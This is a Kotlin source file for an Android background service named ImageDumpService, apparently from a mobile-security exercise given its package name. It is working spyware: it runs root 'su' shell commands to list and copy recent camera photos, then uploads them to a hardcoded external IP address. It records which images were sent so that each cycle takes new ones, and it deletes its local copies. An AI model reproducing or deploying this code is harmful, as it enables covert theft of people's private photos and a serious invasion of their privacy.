package com.example.mobsec_823.malicious

import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader

class ImageDumpService : Service() {

    private val TAG = "ImageDumpService"
    private val PREFS_NAME = "ExfilPrefs"
    private val SENT_IMAGES_KEY = "sent_images_list"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "!!! Image Service Triggered (Periodic Cycle) !!!")

        Thread {
            try {
                // 1. Get the list of already exfiltrated filenames to avoid duplicates
                val sentSet = getSentImages().toMutableSet()

                // 2. Find new images (MediaStore or Root)
                var imagesToExfil = findUnsentImages(sentSet)

                if (imagesToExfil.isEmpty()) {
                    Log.i(TAG, "No new images found to exfiltrate in this cycle.")
                } else {
                    Log.d(TAG, "Found ${imagesToExfil.size} new images. Starting exfiltration...")
                    imagesToExfil.forEach { file ->
                        if (sendImageToAttackerBackend(file)) {
                            sentSet.add(file.name.replace("root_dump_", "")) // Record success
                        }
                        if (file.absolutePath.contains(cacheDir.absolutePath)) {
                            file.delete() // Clean up local copy
                        }
                    }
                    saveSentImages(sentSet) // Save progress for next 15-min cycle
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in Image thread: ${e.message}")
            }
        }.start()

        return START_STICKY
    }

    private fun findUnsentImages(sentSet: Set<String>): List<File> {
        val candidates = mutableListOf<File>()

        // Strategy: Scrape a larger list (last 50) and pick the first 5 that aren't in our 'sent' set
        try {
            val listCommand = "ls -t /sdcard/DCIM/Camera/*.jpg /sdcard/DCIM/Camera/*.jpeg /sdcard/Pictures/*.jpg 2>/dev/null | head -n 50"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", listCommand))
            val reader = BufferedReader(InputStreamReader(process.inputStream))

            var line: String?
            var foundCount = 0
            while (reader.readLine().also { line = it } != null && foundCount < 5) {
                val remotePath = line!!.trim()
                val fileName = remotePath.substringAfterLast("/")

                if (!sentSet.contains(fileName)) {
                    // This is a "new" image we haven't sent yet. Copy it.
                    val localFile = File(cacheDir, "root_dump_$fileName")
                    val copyCommand = "cp \"$remotePath\" \"${localFile.absolutePath}\" && chmod 666 \"${localFile.absolutePath}\""
                    Runtime.getRuntime().exec(arrayOf("su", "-c", copyCommand)).waitFor()

                    if (localFile.exists()) {
                        candidates.add(localFile)
                        foundCount++
                    }
                }
            }
            process.waitFor()
        } catch (e: Exception) {
            Log.e(TAG, "Root search for unsent images failed: ${e.message}")
        }
        return candidates
    }

    private fun sendImageToAttackerBackend(imageFile: File): Boolean {
        return try {
            val client = OkHttpClient()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("image", imageFile.name, imageFile.asRequestBody("image/jpeg".toMediaType()))
                .build()

            val request = Request.Builder()
                .url("http://47.129.144.9:8000/dump/images")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                Log.i(TAG, "Exfiltrated ${imageFile.name}. Status: ${response.code}")
                response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network fail for ${imageFile.name}: ${e.message}")
            false
        }
    }

    private fun getSentImages(): Set<String> {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(SENT_IMAGES_KEY, emptySet()) ?: emptySet()
    }

    private fun saveSentImages(set: Set<String>) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putStringSet(SENT_IMAGES_KEY, set).apply()
    }

    fun dumpImage(imageUri: Uri) { /* Legacy support for manual triggers */ }
}